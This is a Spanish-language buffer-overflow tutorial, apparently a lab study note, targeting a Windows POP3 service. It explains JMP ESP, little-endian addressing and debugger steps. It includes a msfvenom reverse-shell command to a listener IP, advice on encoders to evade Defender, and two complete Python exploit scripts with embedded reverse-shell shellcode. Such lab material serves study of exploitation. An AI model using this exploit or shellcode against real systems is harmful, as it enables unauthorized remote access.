-------
- Tags: #OpCodes #shellcode #esp #eip #msfvenom
-------
# Explicación

> Una vez que se ha generado el shellcode malicioso y se han detectado los badchars, el siguiente paso es hacer que el flujo del programa entre en el shellcode para que sea interpretado. La idea es hacer que el registro EIP apunte a una dirección de memoria donde se aplique un **opcode** que realice un salto al registro **ESP** (**JMP ESP**), que es donde se encuentra el shellcode. Esto es así dado que de primeras no podemos hacer que el EIP apunte directamente a nuestro shellcode.

Para encontrar el opcode **JMP ESP**, se pueden utilizar diferentes herramientas, como **mona.py**, que permite buscar opcodes en módulos específicos de la memoria del programa objetivo. Una vez que se ha encontrado el opcode ‘**JMP ESP**‘, se puede sobrescribir el valor del registro EIP con la dirección de memoria donde se encuentra el opcode, lo que permitirá saltar al registro ESP y ejecutar el shellcode malicioso.

La búsqueda de opcodes para entrar al registro ESP y cargar el shellcode es una técnica utilizada para hacer que el flujo del programa entre en el shellcode para que sea interpretado. Se utiliza el opcode JMP ESP para saltar a la dirección de memoria del registro ESP, donde se encuentra el shellcode.

------
# Generando Shellcode para entablar una Reverse Shell

¿Cómo generamos un Shellcode que a bajo nivel se encargue de entablar una Reverse Shell? Para esto tendremos que **generar** un conjunto de instrucciones en **Hexadecimal** representadas para meter en el **ESP**, para que cuando sea interpretada nos permita ganar acceso a la máquina, esto lo podemos hacer utilizando la herramienta ``msfvenom``, la cual es proveniente de la Suite de **Metasploit**.

- ``msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.0.194 LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread``

Los parámetros utilizados recién realizan las siguientes acciónes.

- ``-p`` se utiliza para colocar el **Payload**, dependiendo del SO frente al que estemos y su arquitectura el Shellcode puede cambiar. Podemos hacer un 
- ``--platform`` se utiliza para indicar la plataforma, en nuestro caso ``windows``.
- ``-a`` se utiliza para indicar la arquitectura (*x86 Bytes* , *x64 Bytes*). Cuando se habla de "x86" en la actualidad, generalmente se hace referencia a la arquitectura de 32 bits porque las versiones modernas de esta arquitectura (antes de la aparición de x86-64 o x64) eran principalmente de 32 bits.
- ``LHOST=tu.ip`` se utiliza para indicar que queremos que nos genere un Shellcode que nos entable una **Reverse Shell** hacia la **IP** indicada.
- ``LPORT=puerto`` se utiliza para indicar el **puerto** por el que se tendrá que estar en escucha para **establecer la conexión**.
- ``-f`` se utiliza para indicar el **formato** que queremos que nos brinde la herramienta en el Encoder.
- ``-e`` se utiliza para indicar el **Encoder** de manera manual
- ``-b`` se utiliza para especificar los **Badchars** entre comillas simples. Ejemplo: ``'\x00\x0a\x0d'``

- ``EXITFUNC=thread`` se utiliza ya que cuando nosotros ejecutamos el Buffer Overflow y logramos ganar acceso a la máquina, es muy probable que cuando salgamos de la consola interactiva **el servicio Crashee** y ya no esté funcional, por lo tanto con esto **creamos un proceso hijo que cuelga de un proceso padre** (principal) para que lo que mate sea al hijo y no el padre que es el más importante. Esto lo utilizamos para que **cuando salgamos el servicio siga estando operativo y podamos volver a explotarlo** para ganar acceso al sistema nuevamente.

Nosotros utilizaremos un **Encoder polimórfico** llamado ``x86/shikata_ga_nai``, también se podría aplicar **Multipolimorfismo** que se realiza empleando múltiples Encoders para **evitar que el Defender te detecte**.

==DATO IMPORTANTE== si estamos en un escenario en el que **detectamos que la aplicación posee muchos Badchars** (más de diez), se recomienda no indicar el **Encoder** ``shikata_ga_nae`` ya que a veces **no podrá generarte el Shellcode correctamente**, es preferible **no indicar** ningún Encoder y que el ``msfvenom`` decida cual es el más óptimo.

Adicional a los parámetros anteriores tenemos los siguientes.

- ``msfvenom -l encoders`` se utiliza para ver todos los **Encoders**.
- ``msfvenom -l payloads`` se utiliza para ver todos los **Payloads**. En función de lo que queramos hacer tendremos que usar uno especifico. Los que dicen ``/meterpreter/`` son únicamente para ser utilizados con el **listener** de Metasploit.

![[BOF 21.png]]

Estas instrucciones en Hexadecimal, es decir el **Shellcode**, lo meteremos dentro de nuestro script en una variable ``shellcode`` además de sumar esa variable a la variable ``payload``, reemplazando el lugar de la variable ``esp``.

```python
#!/usr/bin/python3

import socket
import sys

# Variables globales. 
ip_address = "192.168.0.120"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4

shellcode = (b"\xdd\xc6\xbd\xb7\x06\x6c\xcb\xd9\x74\x24\xf4\x58\x2b\xc9"
b"\xb1\x52\x31\x68\x17\x83\xe8\xfc\x03\xdf\x15\x8e\x3e\xe3"
b"\xf2\xcc\xc1\x1b\x03\xb1\x48\xfe\x32\xf1\x2f\x8b\x65\xc1"
b"\x24\xd9\x89\xaa\x69\xc9\x1a\xde\xa5\xfe\xab\x55\x90\x31"
b"\x2b\xc5\xe0\x50\xaf\x14\x35\xb2\x8e\xd6\x48\xb3\xd7\x0b"
b"\xa0\xe1\x80\x40\x17\x15\xa4\x1d\xa4\x9e\xf6\xb0\xac\x43"
b"\x4e\xb2\x9d\xd2\xc4\xed\x3d\xd5\x09\x86\x77\xcd\x4e\xa3"
b"\xce\x66\xa4\x5f\xd1\xae\xf4\xa0\x7e\x8f\x38\x53\x7e\xc8"
b"\xff\x8c\xf5\x20\xfc\x31\x0e\xf7\x7e\xee\x9b\xe3\xd9\x65"
b"\x3b\xcf\xd8\xaa\xda\x84\xd7\x07\xa8\xc2\xfb\x96\x7d\x79"
b"\x07\x12\x80\xad\x81\x60\xa7\x69\xc9\x33\xc6\x28\xb7\x92"
b"\xf7\x2a\x18\x4a\x52\x21\xb5\x9f\xef\x68\xd2\x6c\xc2\x92"
b"\x22\xfb\x55\xe1\x10\xa4\xcd\x6d\x19\x2d\xc8\x6a\x5e\x04"
b"\xac\xe4\xa1\xa7\xcd\x2d\x66\xf3\x9d\x45\x4f\x7c\x76\x95"
b"\x70\xa9\xd9\xc5\xde\x02\x9a\xb5\x9e\xf2\x72\xdf\x10\x2c"
b"\x62\xe0\xfa\x45\x09\x1b\x6d\xaa\x66\x23\xaf\x42\x75\x23"
b"\x2e\x28\xf0\xc5\x5a\x5e\x55\x5e\xf3\xc7\xfc\x14\x62\x07"
b"\x2b\x51\xa4\x83\xd8\xa6\x6b\x64\x94\xb4\x1c\x84\xe3\xe6"
b"\x8b\x9b\xd9\x8e\x50\x09\x86\x4e\x1e\x32\x11\x19\x77\x84"
b"\x68\xcf\x65\xbf\xc2\xed\x77\x59\x2c\xb5\xa3\x9a\xb3\x34"
b"\x21\xa6\x97\x26\xff\x27\x9c\x12\xaf\x71\x4a\xcc\x09\x28"
b"\x3c\xa6\xc3\x87\x96\x2e\x95\xeb\x28\x28\x9a\x21\xdf\xd4"
b"\x2b\x9c\xa6\xeb\x84\x48\x2f\x94\xf8\xe8\xd0\x4f\xb9\x09"
b"\x33\x45\xb4\xa1\xea\x0c\x75\xac\x0c\xfb\xba\xc9\x8e\x09"
b"\x43\x2e\x8e\x78\x46\x6a\x08\x91\x3a\xe3\xfd\x95\xe9\x04"
b"\xd4")

payload = before_eip + eip + shellcode 


def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, port))
    banner = s.recv(1024)

    s.send(b"USER test" + b'\r\n')
    response = s.recv(1024) 
    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':

    exploit()
```

------

Nuestro objetivo ahora es **cambiar el valor** del **EIP**, ya que con este **tendremos que apuntar a la dirección/address** de donde se encuentra nuestro Shellcode en **la pila**. Recordemos que el problema radica en que no podemos simplemente apuntar a la dirección actual del ESP, si no que tendremos que utilizar una dirección que aplique como **Opcode** un **salto** al ESP, ya que de lo contrario no llegaremos. 

Para nosotros **encontrar** esa dirección especifica que aplique como Opcode un salto al ESP debemos hacer lo siguiente.

En el **Immunity Debugger** en el campo de entrada inferior colocaremos ``!mona modules``, dentro de todos los módulos que nos aparecen veremos que poseen diferentes **protecciones**, estas las notamos observando en la parte superior (``Rebase``, ``SafeSEH``, ``ASLR``, ``CFG``, ``NXCompat``, ``OS Dll``), la idea es que nosotros utilicemos un modulo que las **primeras cuatro** las tenga en **False**.

![[BOF 22.png]]

Una vez identificamos el modulo que nos interese (==Que es importante que recordemos su nombre== ``SLMFC.DLL``) lo que haremos será intentar buscar una instrucción de tipo ``JMP ESP`` para ver si dentro de esta **DLL** hay una dirección que aplique este **Opcode**, de esta manera hacemos que el **EIP** apunte a esta dirección y de esa forma **se aplique un salto al ESP**. 

El **Opcode** correspondiente al JMP ESP debemos saber cual es, esto lo podemos ver a través de la **herramienta** de Metasploit ``/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`` y luego escribiendo ``jmp ESP``.

![[BOF 23.png]]

Este "**FFE4**" se representa de esta forma "``\xFF\xE4``", esto no tiene que estar en **little-endian** porque no es una dirección como tal, a lo que tenemos que darle la vuelta es a las direcciones, esto es un **Opcode**.

 ¿Qué es **little-endian**? El término **little-endian** se refiere a cómo los procesadores almacenan y manejan los bytes en la memoria. Existen dos formas principales de almacenamiento de bytes en memoria:

**Big-endian**: El byte más significativo (el más grande) se almacena primero (en la dirección de memoria más baja).
**Little-endian**: El byte menos significativo (el más pequeño) se almacena primero (en la dirección de memoria más baja).

Por ejemplo, si tienes el número hexadecimal **0x12345678**, que tiene 4 bytes, su almacenamiento sería diferente según el sistema:

- En **big-endian**, el orden sería:  
    **12 34 56 78**  
    (El byte "12" está en la dirección de memoria más baja)
    
- En **little-endian**, el orden sería:  
    **78 56 34 12**  
    (El byte "78" está en la dirección de memoria más baja)

Un ejemplo sería:

Supóngamos que quieres sobrescribir la dirección de retorno con la dirección **0x080414C0**. Si el sistema es **little-endian**, necesitas inyectar esta dirección en memoria de la siguiente manera:  **C0 14 04 08**  
Esto significa que al escribir los bytes de la dirección, tenemos que poner el byte menos significativo (C0) en la posición más baja de la memoria.

Si no tomamos en cuenta que el sistema es **little-endian** y escribimos los bytes en el orden incorrecto, el exploit **no va a funcionar** porque estarías apuntando a una **dirección incorrecta** en memoria.

----

Dentro del Immunity Debugger en el campo de entrada inferior colocaremos ``!mona find -s "\xFF\xE4" -m SLMFC.DLL`` para buscar el patrón (``-s``) ``\xFF\xE4`` (**Que corresponde al JMP ESP**), dentro del módulo (``-m``) ``SLMFC.DLL``.

En los resultados que nos dará la búsqueda anterior, debemos buscar una dirección que **no contenga los Badchars que detectamos** previamente, en mi caso ``\x00`` ``\x0a`` ``\x0d``.

![[BOF 24.png]]

==CABE ACLARAR QUE SI NO ENCUENTRA COINCIDENCIAS PODEMOS UTILIZAR UNA ALTERNATIVA LLAMADA== ``!mona findwild -s "JMP ESP"``

Por lo tanto daremos click derecho y ``Copy to clipboard/Address`` para **pegarlo en nuestro script** en la variable ``eip`` ya que este será el **EIP** nuevo al que debamos apuntar por que **no tiene protecciones** y es un **Opcode** de tipo ``jmp ESP``.
Cable aclarar que este valor **al ser una dirección** como estamos en *32 Bytes (x86)* tiene que **estar al revés**, es decir que **se contempla el concepto de little-endian**, recordemos que ==en el caso de Opcodes no==.

Esto en el script lo hacemos de manera **automática** importando la librería ``pack`` de ``struct`` quedando todo de esta forma.

![[BOF 25.png]]

```python
 #!/usr/bin/python3
 
 from struct import pack
 import socket
 import sys
 
 # Variables globales. 
 ip_address = "192.168.0.120"
 port = 110
 offset = 4654
 
 before_eip = b"A"*offset
 eip = pack("<L", 0x5f4bcc6b)
 
shellcode = (b"\xdd\xc6\xbd\xb7\x06\x6c\xcb\xd9\x74\x24\xf4\x58\x2b\xc9"
b"\xb1\x52\x31\x68\x17\x83\xe8\xfc\x03\xdf\x15\x8e\x3e\xe3"
b"\xf2\xcc\xc1\x1b\x03\xb1\x48\xfe\x32\xf1\x2f\x8b\x65\xc1"
b"\x24\xd9\x89\xaa\x69\xc9\x1a\xde\xa5\xfe\xab\x55\x90\x31"
b"\x2b\xc5\xe0\x50\xaf\x14\x35\xb2\x8e\xd6\x48\xb3\xd7\x0b"
b"\xa0\xe1\x80\x40\x17\x15\xa4\x1d\xa4\x9e\xf6\xb0\xac\x43"
b"\x4e\xb2\x9d\xd2\xc4\xed\x3d\xd5\x09\x86\x77\xcd\x4e\xa3"
b"\xce\x66\xa4\x5f\xd1\xae\xf4\xa0\x7e\x8f\x38\x53\x7e\xc8"
b"\xff\x8c\xf5\x20\xfc\x31\x0e\xf7\x7e\xee\x9b\xe3\xd9\x65"
b"\x3b\xcf\xd8\xaa\xda\x84\xd7\x07\xa8\xc2\xfb\x96\x7d\x79"
b"\x07\x12\x80\xad\x81\x60\xa7\x69\xc9\x33\xc6\x28\xb7\x92"
b"\xf7\x2a\x18\x4a\x52\x21\xb5\x9f\xef\x68\xd2\x6c\xc2\x92"
b"\x22\xfb\x55\xe1\x10\xa4\xcd\x6d\x19\x2d\xc8\x6a\x5e\x04"
b"\xac\xe4\xa1\xa7\xcd\x2d\x66\xf3\x9d\x45\x4f\x7c\x76\x95"
b"\x70\xa9\xd9\xc5\xde\x02\x9a\xb5\x9e\xf2\x72\xdf\x10\x2c"
b"\x62\xe0\xfa\x45\x09\x1b\x6d\xaa\x66\x23\xaf\x42\x75\x23"
b"\x2e\x28\xf0\xc5\x5a\x5e\x55\x5e\xf3\xc7\xfc\x14\x62\x07"
b"\x2b\x51\xa4\x83\xd8\xa6\x6b\x64\x94\xb4\x1c\x84\xe3\xe6"
b"\x8b\x9b\xd9\x8e\x50\x09\x86\x4e\x1e\x32\x11\x19\x77\x84"
b"\x68\xcf\x65\xbf\xc2\xed\x77\x59\x2c\xb5\xa3\x9a\xb3\x34"
b"\x21\xa6\x97\x26\xff\x27\x9c\x12\xaf\x71\x4a\xcc\x09\x28"
b"\x3c\xa6\xc3\x87\x96\x2e\x95\xeb\x28\x28\x9a\x21\xdf\xd4"
b"\x2b\x9c\xa6\xeb\x84\x48\x2f\x94\xf8\xe8\xd0\x4f\xb9\x09"
b"\x33\x45\xb4\xa1\xea\x0c\x75\xac\x0c\xfb\xba\xc9\x8e\x09"
b"\x43\x2e\x8e\x78\x46\x6a\x08\x91\x3a\xe3\xfd\x95\xe9\x04"
b"\xd4")
 
 payload = before_eip + eip + shellcode 
 
 
 def exploit():
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((ip_address, port))
     banner = s.recv(1024)
 
     s.send(b"USER test" + b'\r\n')
     response = s.recv(1024) 
     s.send(b"PASS " + payload + b'\r\n')
     s.close()
 
 if __name__ == '__main__':
 
     exploit()
```

Ahora vamos a crear un **Breakpoint** a través de Immunity Debugger de la siguiente forma.

Un **Breakpoint** (punto de interrupción) es una herramienta utilizada en la depuración de programas que permite pausar la ejecución del código en un punto específico. Cuando se coloca un Breakpoint en una línea o dirección de memoria, el programa se detiene justo antes de ejecutar esa instrucción

Clickeamos en el **icono de la parte superior** que está a la izquierda del botón "``l``", luego colocamos la **dirección/address** que habíamos copiado del módulo, en mi caso *5F4BCC6B* pero agregándole ``0x`` al principio, esto lo que hará será seguir esa dirección especifica que en nuestro caso es la **JMP ESP**, luego daremos click derecho sobre ese resultado y presionamos en ``Breakpoint/Toggle`` para marcarlo.

![[BOF 26.png]]

![[BOF 27.png]]

Ahora lo que queda es verificar que el **EIP apunte hacia esa dirección** y ver si conseguimos **entrar al ESP** ejecutando nuestro script.

------

![[BOF 28.png]]

Ahora bien, si el **EIP** que contempla la siguiente instrucción que se tiene que ejecutar, está apuntando a la dirección *5F4BCC6B*, en este caso el Opcode: ``JPM ESP``, si esto se cumple se va a aplicar un salto al **ESP** que ahora vale *024CA128*, en la siguiente instrucción que suceda, **el valor del EIP debería ser igual al del ESP**, por lo tanto ambos quedarían con el valor *024CA128*.

El **EIP** termina valiendo lo mismo que el **ESP** porque la instrucción `JMP ESP` le dice al procesador que salte a la dirección almacenada en el registro **ESP**. En este caso, **EIP** (que siempre apunta a la próxima instrucción a ejecutar) cambia su valor para coincidir con el contenido de **ESP**, ya que **JMP ESP** redirige la ejecución hacia esa dirección.

Le daremos click al botón de ``Step into`` para que pase a la siguiente instrucción.

![[BOF 29.png]]

![[BOF 30.png]]

De esta forma verificamos correctamente que el **EIP** está **entrando al ESP** a través del **JMP ESP**.

Tenemos que entender que a pesar de que nuestro **Shellcode** esté ahí y ya hayamos conseguido la forma de **apuntar a el**, este **no será interpretado** ya que hay que darle un espacio, esto lo veremos en la siguiente sección.